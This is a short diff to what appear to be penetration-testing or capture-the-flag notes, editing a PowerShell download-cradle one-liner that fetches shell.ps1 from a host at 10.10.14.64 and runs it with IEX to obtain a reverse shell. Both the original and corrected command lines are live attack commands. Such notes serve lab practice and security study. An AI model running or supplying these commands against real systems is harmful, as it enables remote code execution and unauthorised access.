@@ -17,7 +17,7 @@ this line at the end of shell.ps1
 # this is what gets us the reverse shell
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1')"
 
-echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1')" | 
+echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1') | powershell -noprofile -
 ```
 
 smbserver or powershell download file
